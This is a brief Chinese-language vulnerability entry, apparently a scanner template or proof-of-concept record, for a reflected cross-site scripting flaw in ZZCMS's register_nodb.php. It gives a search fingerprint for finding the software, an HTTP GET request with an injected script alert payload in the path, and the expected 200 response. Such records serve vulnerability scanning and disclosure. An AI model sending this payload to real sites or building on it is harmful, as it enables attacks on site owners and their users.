# ZZCMSregister_nodb存在反射xss漏洞

ZZCMSregister ｜ XSS ｜ —
- **指纹**：`body="zzcms专业做招商网的程序源码"`
- **请求**：`GET /3/ucenter_api/code/register_nodb.php/"><script>alert(document.doamin)</script> HTTP/1.1`
- **响应特征**：200